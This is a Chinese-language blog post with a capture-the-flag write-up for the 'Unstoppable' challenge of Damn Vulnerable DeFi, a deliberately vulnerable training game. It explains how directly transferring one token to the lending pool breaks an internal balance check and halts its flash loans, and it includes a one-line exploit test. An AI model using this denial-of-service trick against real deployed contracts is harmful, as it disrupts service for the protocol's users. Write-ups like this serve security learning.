---
layout: post
title: Damn Vulnerable DeFi - 1. Unstoppable
date:  2022-12-12
tags:  solidity ethereum
---

在開始挑戰之前，先確定已經 clone [這個 repo](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v2.2.0) 並執行 `yarn` 來下載需要的套件。

## Description
> There's a lending pool with a million DVT tokens in balance, offering flash loans for free.<br />
If only there was a way to attack and stop the pool from offering flash loans ...<br />
You start with 100 DVT tokens in balance.
- [See the contracts](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v2.2.0/contracts/unstoppable)

## Writeup
合約的第 40 行有一句 `assert(poolBalance == balanceBefore);` 檢查 poolBalance 是否與 balanceBefore 相等，如果不相等，執行 `flashLoan` function 的時候將會在這裡失敗。


`poolBalance` 會因為執行 `depositTokens` function 而改變，如果我們不使用這個 function，而是直接用 `transfer` 將 token 轉入合約，就會讓 `poolBalance` 與 `balanceBefore` 不相等。


1. 修改 `test/unstoppable/unstoppable.challenge.js`
    ``` js
    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        await this.token.connect(attacker).transfer(this.pool.address, 1);
    });
    ```

2. `yarn run unstoppable` to exploit !

